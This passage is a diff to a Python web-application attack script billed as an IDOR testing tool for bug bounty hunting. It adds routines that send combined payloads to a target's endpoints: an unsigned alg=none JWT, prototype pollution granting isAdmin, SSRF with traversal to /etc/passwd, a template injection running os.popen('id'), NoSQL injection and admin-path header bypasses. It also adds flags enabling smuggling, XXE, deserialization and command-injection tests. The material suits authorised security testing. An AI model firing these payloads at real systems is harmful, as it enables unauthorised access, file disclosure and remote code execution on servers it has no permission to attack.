+        ]
+        
+        # Test on various endpoints
+        test_endpoints = [
+            f"{self.target_url}/file",
+            f"{self.target_url}/api/file",
+            f"{self.target_url}/download",
+            f"{self.target_url}/api/download"
+        ]
+        
+        for endpoint in test_endpoints:
+            for payload in encoding_payloads:
+                try:
+                    # Test as path parameter
+                    test_url = f"{endpoint}/{payload}"
+                    
+                    response = requests.get(
+                        test_url,
+                        headers=self.headers,
+                        cookies=self.cookies,
+                        proxies=self.proxy,
+                        verify=self.verify_ssl,
+                        timeout=self.timeout
+                    )
+                    
+                    # Check for encoding bypass indicators
+                    if response.status_code == 200 and len(response.text) > 100:
+                        self.findings.append({
+                            "type": "Advanced Encoding Bypass",
+                            "endpoint": test_url,
+                            "description": "Potential encoding bypass vulnerability",
+                            "severity": "MEDIUM",
+                            "details": {
+                                "payload": payload,
+                                "response_size": len(response.text)
+                            }
+                        })
+                        
+                except Exception as e:
+                    if self.verbose:
+                        console.print(f"[yellow]Error in advanced encoding test: {str(e)}[/yellow]")
+
+    def _test_combined_attack_vectors(self):
+        """Test for combined attack vectors"""
+        if self.verbose:
+            console.print("[bold blue]Testing for combined attack vectors...[/bold blue]")
+        
+        # Combined attack payloads
+        combined_payloads = [
+            # JWT + Prototype Pollution
+            {
+                "headers": {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ."},
+                "json": {"__proto__": {"isAdmin": True}}
+            },
+            # SSRF + Path Traversal
+            {
+                "params": {"url": "http://127.0.0.1:80/../../../etc/passwd"},
+                "headers": {"X-Forwarded-For": "127.0.0.1"}
+            },
+            # Template Injection + Command Injection
+            {
+                "params": {"template": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"},
+                "headers": {"X-Original-URL": "/admin"}
+            },
+            # NoSQL + Prototype Pollution
+            {
+                "json": {"$or": [{"__proto__": {"isAdmin": True}}, {"username": "admin"}]},
+                "headers": {"Content-Type": "application/json"}
+            }
+        ]
+        
+        # Test on various endpoints
+        test_endpoints = [
+            f"{self.target_url}/api/combined",
+            f"{self.target_url}/api/advanced",
+            f"{self.target_url}/api/test",
+            f"{self.target_url}/api/security"
+        ]
+        
+        for endpoint in test_endpoints:
+            for payload in combined_payloads:
+                try:
+                    response = requests.post(
+                        endpoint,
+                        **payload,
+                        cookies=self.cookies,
+                        proxies=self.proxy,
+                        verify=self.verify_ssl,
+                        timeout=self.timeout
+                    )
+                    
+                    # Check for combined attack indicators
+                    if response.status_code in [200, 201] and len(response.text) > 50:
+                        self.findings.append({
+                            "type": "Combined Attack Vector",
+                            "endpoint": endpoint,
+                            "description": "Potential combined attack vector vulnerability",
+                            "severity": "HIGH",
+                            "details": {
+                                "payload": str(payload)[:200],
+                                "response": response.text[:200]
+                            }
+                        })
+                        
+                except Exception as e:
+                    if self.verbose:
+                        console.print(f"[yellow]Error in combined attack test: {str(e)}[/yellow]")
+
 def main():
     parser = argparse.ArgumentParser(description='Advanced IDOR Vulnerability Testing Script for Bug Bounty Hunting')
     parser.add_argument('-u', '--url', required=True, help='Target URL')
@@ -2303,6 +3397,26 @@ def main():
     # Advanced testing options
     parser.add_argument('--advanced-traversal', action='store_true', help='Enable advanced path traversal testing (double encoding, mixed slashes, dotless)')
     
+    # Ultra-sophisticated combined attack vectors
+    parser.add_argument('--graphql-introspection', action='store_true', help='Enable GraphQL introspection testing')
+    parser.add_argument('--jwt-advanced', action='store_true', help='Enable advanced JWT manipulation testing')
+    parser.add_argument('--prototype-pollution', action='store_true', help='Enable prototype pollution testing')
+    parser.add_argument('--http-smuggling', action='store_true', help='Enable HTTP request smuggling testing')
+    parser.add_argument('--ssrf', action='store_true', help='Enable SSRF testing')
+    parser.add_argument('--cache-poisoning', action='store_true', help='Enable cache poisoning testing')
+    parser.add_argument('--deserialization', action='store_true', help='Enable deserialization testing')
+    parser.add_argument('--template-injection', action='store_true', help='Enable template injection testing')
+    parser.add_argument('--nosql-injection', action='store_true', help='Enable NoSQL injection testing')
+    parser.add_argument('--ldap-injection', action='store_true', help='Enable LDAP injection testing')
+    parser.add_argument('--xxe', action='store_true', help='Enable XML External Entity testing')
+    parser.add_argument('--ssi', action='store_true', help='Enable Server-Side Includes testing')
+    parser.add_argument('--command-injection', action='store_true', help='Enable command injection testing')
+    parser.add_argument('--advanced-encoding', action='store_true', help='Enable advanced encoding bypass testing')
+    parser.add_argument('--combined-attacks', action='store_true', help='Enable combined attack vector testing')
+    
+    # Enable all ultra-sophisticated attacks
+    parser.add_argument('--all-ultra-sophisticated', action='store_true', help='Enable all ultra-sophisticated attack vectors')
+    
     args = parser.parse_args()
     
     # Enable all high-value tests if --all-high-value is specified
@@ -2318,6 +3432,24 @@ def main():
         args.api_keys = True
         args.oauth = True
         args.advanced_traversal = True
+    
+    # Enable all ultra-sophisticated attacks if --all-ultra-sophisticated is specified
+    if args.all_ultra_sophisticated:
+        args.graphql_introspection = True
+        args.jwt_advanced = True
+        args.prototype_pollution = True
+        args.http_smuggling = True
+        args.ssrf = True
+        args.cache_poisoning = True
+        args.deserialization = True
+        args.template_injection = True
+        args.nosql_injection = True
+        args.ldap_injection = True
+        args.xxe = True
+        args.ssi = True
+        args.command_injection = True
+        args.advanced_encoding = True
+        args.combined_attacks = True
     
     try:
         tester = IDORTester(args)
